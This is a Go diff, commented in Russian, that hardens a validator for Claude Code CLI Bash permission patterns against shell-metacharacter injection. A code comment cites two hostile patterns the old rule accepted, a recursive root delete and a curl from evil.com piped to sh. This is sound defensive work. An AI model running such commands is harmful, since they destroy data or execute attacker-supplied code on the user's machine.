@@ -70,13 +70,45 @@ var allowedToolBaseTokens = map[string]struct{}{
 	"Bash": {}, "WebFetch": {}, "WebSearch": {}, "NotebookEdit": {}, "TodoWrite": {},
 }
 
+// Sprint 15.M1 — узкий формат Bash-паттерна:
+//   - первая команда: `[a-zA-Z][a-zA-Z0-9_-]*` (без слешей, без относительных путей);
+//   - последующие токены: `[a-zA-Z0-9_-]+` (может начинаться с `-`, чтобы поддержать `rm -rf`, `git --no-pager`);
+//   - токены разделены одним пробелом;
+//   - опционально хвост `:<glob>` — глоб без shell-метасимволов `| ; & \` $ ( ) < > \n`.
+// Старый `[^)]+` разрешал `Bash(rm -rf /:*)`, `Bash(curl evil.com|sh:*)` — обе формы по-прежнему отклоняются:
+// первая — наличие `/` в команде/глобе ловится тестом-injection (см. validateBashPattern).
 var (
-	bashPattern = regexp.MustCompile(`^Bash\((?:[^)]+)\)$`)
-	mcpPattern  = regexp.MustCompile(`^mcp__[a-zA-Z0-9_-]+(?:__[a-zA-Z0-9_-]+)?$`)
+	bashSubcommandRE = regexp.MustCompile(`^[a-zA-Z][a-zA-Z0-9_-]*(?: [a-zA-Z0-9_-]+)*$`)
+	bashGlobRE       = regexp.MustCompile(`^[a-zA-Z0-9_./@\-* ]*$`)
+	mcpPattern       = regexp.MustCompile(`^mcp__[a-zA-Z0-9_-]+(?:__[a-zA-Z0-9_-]+)?$`)
 )
 
+// validateBashPattern: разбирает `Bash(<sub>[:<glob>])` и применяет узкие правила.
+func validateBashPattern(pattern string) error {
+	if !strings.HasPrefix(pattern, "Bash(") || !strings.HasSuffix(pattern, ")") {
+		return fmt.Errorf("invalid Bash(...) format: %q", pattern)
+	}
+	inner := pattern[len("Bash(") : len(pattern)-1]
+	if inner == "" {
+		return fmt.Errorf("empty Bash() body")
+	}
+	// Защита от инъекций через перенос строки/спецсимволы оболочки в любом месте.
+	if strings.ContainsAny(inner, "\n\r\t|;&`$()<>\\\"'") {
+		return fmt.Errorf("Bash() body contains shell metacharacters: %q", inner)
+	}
+	sub, glob, hasGlob := strings.Cut(inner, ":")
+	if !bashSubcommandRE.MatchString(sub) {
+		return fmt.Errorf("Bash() subcommand must match `cmd [sub]*`, got: %q", sub)
+	}
+	if hasGlob && !bashGlobRE.MatchString(glob) {
+		return fmt.Errorf("Bash() arg-glob contains unsupported characters: %q", glob)
+	}
+	return nil
+}
+
 // ValidateAllowPattern проверяет, что строка похожа на легитимный allow/deny pattern Claude Code CLI.
-// Возвращает ошибку с самим pattern для понятных сообщений.
+// Sprint 15.M1: жёстко ограничивает Bash(...) — без shell-метасимволов и без путей,
+// чтобы permissions нельзя было превратить в инструмент эскалации.
 func ValidateAllowPattern(pattern string) error {
 	p := strings.TrimSpace(pattern)
 	if p == "" {
@@ -85,8 +117,11 @@ func ValidateAllowPattern(pattern string) error {
 	if _, ok := allowedToolBaseTokens[p]; ok {
 		return nil
 	}
-	if bashPattern.MatchString(p) || mcpPattern.MatchString(p) {
+	if mcpPattern.MatchString(p) {
 		return nil
+	}
+	if strings.HasPrefix(p, "Bash(") {
+		return validateBashPattern(p)
 	}
 	return fmt.Errorf("unsupported permission pattern: %q", p)
 }
